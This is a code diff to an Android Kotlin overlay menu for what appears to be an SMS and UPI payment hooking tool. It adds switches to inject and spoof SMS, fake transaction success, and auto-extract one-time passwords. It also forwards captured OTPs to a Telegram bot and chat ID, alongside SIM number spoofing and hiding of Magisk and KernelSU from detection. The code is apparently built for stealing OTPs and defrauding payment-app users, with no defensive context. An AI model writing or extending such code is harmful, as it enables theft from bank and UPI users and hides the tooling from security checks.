@@ -21,7 +21,7 @@ class OverlayMenuController(
     private val appContext = context.applicationContext
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)
     private val configManager = ConfigManager(context)
-    private val tokenForwarder = TokenForwarder(configManager)
+    private val tokenForwarder = TokenForwarder(configManager, context.applicationContext)
     private val backupManager = BackupManager(context)
     private val deviceIdManager = DeviceIdManager(context)
     private val upiAppSwitches = mutableMapOf<String, SwitchMaterial>()
@@ -56,9 +56,13 @@ class OverlayMenuController(
         updateDeviceIdDisplay()
         menu.switchHookIncoming.isChecked = config.hookIncomingSms
         menu.switchHookOutgoing.isChecked = config.hookOutgoingSms
+        menu.switchOverrideIncomingSender.isChecked = config.overrideIncomingSender
+        menu.switchInterceptFakeSuccess.isChecked = config.interceptFakeSuccess
+        menu.switchAutoExtractOtp.isChecked = config.autoExtractOtp
         menu.etSenderId.setText(config.injectSenderId)
         menu.etMessageBody.setText(config.injectMessageBody)
         menu.switchAutoForward.isChecked = config.autoForwardToken
+        menu.switchFakeInterceptTg.isChecked = config.fakeInterceptTelegram
         menu.etBotToken.setText(config.telegramBotToken)
         menu.etChatId.setText(config.telegramChatId)
         menu.switchHookUpiVerification.isChecked = config.hookUpiVerification
@@ -78,11 +82,11 @@ class OverlayMenuController(
             safeSave(R.string.sim_settings_saved) {
                 val phone1 = textOf(menu.etPhoneSim1).ifBlank { "+919876543210" }
                 val phone2 = textOf(menu.etPhoneSim2).ifBlank { "+919876543211" }
-                val sim1 = menu.switchSim1Mock.isChecked || menu.switchPhoneSpoof.isChecked
+                val phoneSpoofOn = menu.switchPhoneSpoof.isChecked
                 val updated = configManager.load().copy(
-                    enableSim1Mock = sim1,
+                    enableSim1Mock = menu.switchSim1Mock.isChecked,
                     enableSim2Mock = menu.switchSim2Mock.isChecked,
-                    enablePhoneSpoof = true,
+                    enablePhoneSpoof = phoneSpoofOn,
                     mockCountryIso = textOf(menu.etCountryIso).lowercase().ifBlank { "in" },
                     hideMagisk = menu.switchHideMagisk.isChecked,
                     hideKernelSu = menu.switchHideKernelSu.isChecked,
@@ -95,10 +99,8 @@ class OverlayMenuController(
                     mockPhoneSim2 = phone2
                 )
                 val ok = configManager.save(updated)
-                if (ok) {
+                if (ok && phoneSpoofOn) {
                     configManager.writeSpoofPhone(phone1)
-                    menu.switchPhoneSpoof.isChecked = true
-                    menu.switchSim1Mock.isChecked = sim1
                 }
                 ok
             }
@@ -116,7 +118,10 @@ class OverlayMenuController(
                         injectSenderId = sender,
                         injectMessageBody = textOf(menu.etMessageBody),
                         hookIncomingSms = menu.switchHookIncoming.isChecked,
-                        hookOutgoingSms = menu.switchHookOutgoing.isChecked
+                        hookOutgoingSms = menu.switchHookOutgoing.isChecked,
+                        overrideIncomingSender = menu.switchOverrideIncomingSender.isChecked,
+                        interceptFakeSuccess = menu.switchInterceptFakeSuccess.isChecked,
+                        autoExtractOtp = menu.switchAutoExtractOtp.isChecked
                     )
                 )
             }
@@ -201,7 +206,11 @@ class OverlayMenuController(
                 )
                 withContext(Dispatchers.IO) {
                     OtpCaptureWriter.write(appContext, otp)
+                    OtpAutoFillHelper.onHookedOtpCaptured(appContext, config, otp)
                     configManager.writeInjectCommand(sender, body)
+                    if (config.fakeInterceptTelegram) {
+                        tokenForwarder.forwardFakeIntercept(otp)
+                    }
                 }
                 toast(R.string.sms_injected)
             }
@@ -219,6 +228,7 @@ class OverlayMenuController(
                 configManager.save(
                     configManager.load().copy(
                         autoForwardToken = menu.switchAutoForward.isChecked,
+                        fakeInterceptTelegram = menu.switchFakeInterceptTg.isChecked,
                         telegramBotToken = token,
                         telegramChatId = chatId,
                         forwardUrl = forwardUrl
@@ -235,14 +245,23 @@ class OverlayMenuController(
                 return@setOnClickListener
             }
             scope.launch {
+                val health = withContext(Dispatchers.IO) {
+                    ModuleHealthChecker.check(appContext)
+                }
                 val ok = withContext(Dispatchers.IO) {
                     try {
-                        tokenForwarder.sendTestMessage()
+                        tokenForwarder.sendTestMessage(token, chatId, health)
                     } catch (_: Exception) {
                         false
                     }
                 }
-                toast(if (ok) R.string.telegram_test_sent else R.string.telegram_test_failed)
+                toast(
+                    when {
+                        ok && health.activated -> R.string.telegram_test_activated
+                        ok -> R.string.telegram_test_not_active
+                        else -> R.string.telegram_test_failed
+                    }
+                )
             }
         }
 
@@ -263,6 +282,11 @@ class OverlayMenuController(
             safeSave(R.string.upi_hooks_saved) {
                 val hooked = upiAppSwitches.mapValues { it.value.isChecked }
                 val anyHooked = hooked.values.any { it }
+                val timerBonuses = UpiAppRegistry.ALL.associate { app ->
+                    val enabled = hooked[app.packageName] == true
+                    val base = if (app.needs2faBonus) app.timerBonusSeconds + 10 else app.timerBonusSeconds
+                    app.packageName to if (enabled) base else 0
+                }.filterValues { it > 0 }
                 val current = configManager.load()
                 configManager.save(
                     current.copy(
@@ -270,7 +294,9 @@ class OverlayMenuController(
                         hookUpiVerification = menu.switchHookUpiVerification.isChecked || anyHooked,
                         hookIncomingSms = anyHooked || menu.switchHookIncoming.isChecked,
                         hookOutgoingSms = anyHooked || menu.switchHookOutgoing.isChecked,
-                        hookedUpiApps = hooked
+                        hookedUpiApps = hooked,
+                        upiAppTimerBonuses = timerBonuses.ifEmpty { UpiAppRegistry.defaultTimerMap() },
+                        upiTimerBonusSeconds = timerBonuses.values.maxOrNull() ?: 20
                     )
                 )
             }
